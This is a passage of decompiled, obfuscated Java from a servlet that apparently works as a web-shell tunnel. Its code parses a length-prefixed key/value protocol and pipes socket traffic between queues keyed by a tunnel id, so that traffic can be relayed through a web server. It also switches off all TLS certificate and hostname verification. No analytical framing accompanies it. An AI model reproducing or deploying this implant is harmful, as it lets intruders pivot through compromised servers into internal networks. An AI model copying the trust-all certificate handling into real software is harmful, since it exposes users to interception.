                while(var9 < var7.length) {
                    int var10 = var7[var9] & 255;
                    ++var9;
                    if (var9 + var10 > var7.length) {
                        throw new Exception("key len error");
                    }

                    byte[] var15 = this.copyOfRange(var7, var9, var9 + var10);
                    String var11 = new String(var15);
                    var9 += var10;
                    if (var9 + 4 > var7.length) {
                        throw new Exception("value len error");
                    }

                    var15 = this.copyOfRange(var7, var9, var9 + 4);
                    int var12 = this.bytesToU32(var15);
                    var9 += 4;
                    if (var12 < 0) {
                        throw new Exception("value error");
                    }

                    if (var9 + var12 > var7.length) {
                        throw new Exception("value error");
                    }

                    byte[] var13 = this.copyOfRange(var7, var9, var9 + var12);
                    var9 += var12;
                    var2.put(var11, var13);
                }

                return var2;
            }
        } else {
            return var2;
        }
    }

    private String randomString(int var1) {
        if (var1 <= 0) {
            return "";
        } else {
            Random var2 = new Random();
            char[] var3 = new char[var1];

            for(int var4 = 0; var4 < var1; ++var4) {
                int var5 = var2.nextInt(this.CHARACTERS_LENGTH);
                var3[var4] = "abcdefghijklmnopqrstuvwxyz0123456789".charAt(var5);
            }

            return new String(var3);
        }
    }

    public boolean verify(String var1, SSLSession var2) {
        return true;
    }

    public void checkClientTrusted(X509Certificate[] var1, String var2) throws CertificateException {
    }

    public void checkServerTrusted(X509Certificate[] var1, String var2) throws CertificateException {
    }

    public X509Certificate[] getAcceptedIssuers() {
        return new X509Certificate[0];
    }

    public void run() {
        if (this.mode == 0) {
            try {
                this.pipeStream(this.gInStream, this.gOutStream, true);
            } catch (Exception var17) {
            }

        } else {
            Object[] var1 = (Object[])((Object[])this.getKey(this.gtunId));
            if (var1 != null && var1.length == 3) {
                SocketChannel var2 = (SocketChannel)var1[0];
                BlockingQueue var3 = (BlockingQueue)var1[1];
                BlockingQueue var4 = (BlockingQueue)var1[2];
                boolean var5 = false;

                try {
                    if (this.mode == 1) {
                        ByteBuffer var20 = ByteBuffer.allocate(16384);

                        while(true) {
                            byte[] var21 = this.readSocketChannel(var2, var20);
                            if (var21.length == 0) {
                                break;
                            }

                            if (!var3.offer(var21, 60L, TimeUnit.SECONDS)) {
                                var5 = true;
                                break;
                            }
                        }
                    } else {
                        while(true) {
                            byte[] var6 = (byte[])var4.poll(300L, TimeUnit.SECONDS);
                            if (var6 == null || var6.length == 0) {
                                var5 = true;
                                break;
                            }

                            ByteBuffer var7 = ByteBuffer.wrap(var6);

                            while(var7.hasRemaining()) {
                                var2.write(var7);
                            }
                        }
                    }
                } catch (Exception var18) {
                } finally {
                    if (var5) {
                        this.removeKey(this.gtunId);
                    }

                    var3.clear();
                    var4.clear();

                    try {
                        var4.put(new byte[0]);
                        var2.close();
                    } catch (Exception var16) {
                    }

                }

            }
        }
    }

    public void init(ServletConfig var1) throws ServletException {
    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public String getServletInfo() {
        return "";
    }

    public void destroy() {
    }
}
